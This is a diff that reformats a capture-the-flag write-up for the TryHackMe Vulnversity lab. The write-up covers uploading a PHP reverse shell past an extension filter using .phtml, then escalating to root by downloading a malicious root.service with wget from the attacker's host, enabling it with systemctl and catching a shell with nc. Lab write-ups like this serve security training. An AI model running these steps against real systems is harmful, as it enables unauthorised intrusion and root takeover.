@@ -1,9 +1,9 @@
 # Vulnsersity
 **Category:** Web
 ## Challenge Details
-TryHackMe Challenge: [Vulnersity](https://tryhackme.com/room/vulnversity).
-Server IP address: 10.10.46.102
-Local IP address: 10.8.73.170
+TryHackMe Challenge: [Vulnersity](https://tryhackme.com/room/vulnversity).  
+Server IP address: 10.10.46.102  
+Local IP address: 10.8.73.170  
 Learn about active recon, web app attacks and privilege escalation.  
 - Port scanning
 - PHP reverse shell (file upload)
@@ -40,11 +40,11 @@ Upon visiting the directory `/internal/`, a file upload page was discovered.
 ### Compromise the webserver  
 
 When uploading a [PHP reverse shell script](https://github.com/pentestmonkey/php-reverse-shell), it appears that the file extension `.php` is not allowed. After brute-forcing with other extensions, `.phtml` seemed to be allowed.  
->.php
->.php3
->.php4
->.php5
->***.phtml***
+> .php  
+> .php3  
+> .php4  
+> .php5  
+> ***.phtml***
 
 To gain remote access to this machine, follow these steps:
 1. Edit the php-reverse-shell.php file and edit the ip to be your IP address.
@@ -87,7 +87,7 @@ To gain root access to this machine, follow these steps:
 1. Transfer root.service to the remote machine. This can be done by hosting a http service and downloading the file from the remote machine.
 2. Enter ```python3 -m http.server```on the local machine.
 3. Switch to the remote machine to download root.service into /tmp directory.
-4. Enter ```wget http://10.8.73.170:8000/root.service
+4. Enter ```wget http://10.8.73.170:8000/root.service```
 ![](images/6.png)  
 5. enable root.service using `systemctl enable /tmp/root.service`.
 6. Start listener on local machine. `nc -lvnp 9999`.
